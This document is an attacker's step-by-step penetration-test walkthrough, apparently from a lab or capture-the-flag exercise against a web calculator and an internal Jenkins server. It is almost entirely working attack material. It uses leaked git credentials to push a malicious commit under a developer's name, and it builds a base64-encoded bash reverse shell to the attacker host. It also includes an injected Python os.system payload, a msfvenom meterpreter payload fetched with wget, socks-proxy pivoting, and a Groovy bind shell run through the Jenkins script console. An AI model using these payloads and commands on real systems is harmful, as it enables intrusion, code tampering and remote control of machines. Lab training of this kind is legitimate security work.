# Black-box Penetration Test 2

Attacker IP:  192.148.53.2
Target Domain : http://online-calc.com/
Target IP     : 192.148.53.3

## Ping Sweep
nmap -sn 192.148.53.0/24 | grep "192*" | cut -d ' ' -f6 | tr -d '(' | tr ')' ' '

## Nmap Scan
nmap -sS -sV -A 192.148.53.3

## Dirb Scan
dirb http://online-calc.com:8000/.git/

http://online-calc.com:8000/.git/HEAD                                                                         
http://online-calc.com:8000/console
http://online-calc.com:8000/.git/config
  |
    name = Jeremy McCarthy <jeremy@dummycorp.com>
      email = jeremy@dummycorp.com
      password = diamonds
      username = jeremy

      http://online-calc.com/projects/online-calc
-------------------------------------------------------------------------------
git clone http://online-calc.com/projects/online-calc
cd online-calc
git logs
modify API.py
git add .
git commit -m "bug fix" --author "Jeremy McCarthy <jeremy@dummycorp.com>"
git push

## Reverse Shell
echo 'bash -c "bash -i >& /dev/tcp/192.148.53.2/7777 0>&1"' | base64
  o/p: YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTQ4LjUzLjIvNzc3NyAwPiYxIgo=

## Payload to get netcat connection
__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTQ4LjUzLjIvNzc3NyAwPiYxIgo= | base64 -d | bash")

## Run netcat listener in terminal
nc -lvp 7777

find / -iname *flag*
cat flag.txt

## Prepare payload for meterpreter connection
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.148.53.2 LPORT=8888 -f elf > payload.bin

## Run python webserver to transfer payload on compromised machine
python -m SimpleHTTPServer

## Download payload on compromised machine
wget 192.148.53.2:8000/payload.bin
chmod +x payload.bin

## Meanwhile keep meterpreter multi handler listener ready
use multi/handler
set LHOST 192.148.53.2
set LPORT 8888
exploit

## Run payload on compromised machine
./payload.bin

# In meterpreter session get the second network ip to pivot
ifconfig

# Second network  : 192.78.79.2
## Put meterpreter session in background and add route
bg
route add 192.78.79.0/24 1 (1 is session id)

## Set up Socks proxy convert the meterpreter session to serve as a socks
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 9050
run -j

## Run port scan
use auxiliary/scanner/portscan/tcp
set RHOSTS
set RPORT
set ....
exploit

## Run nmap scan
proxychains nmap -sT -sV -Pn 192.78.79.3

jenkins service is running on port 8080

## Configure Socks4 proxy in browser to access jenkins dashboard via browser
visit 192.78.79.3:8080

## Go to script console and put following bind shell in console and hit run

int port=5555;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new java.net.ServerSocket(port).accept()
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

## Start netcat listener on port 5555
proxychains nc -v 192.78.79.3 5555
ls
id
ps aux
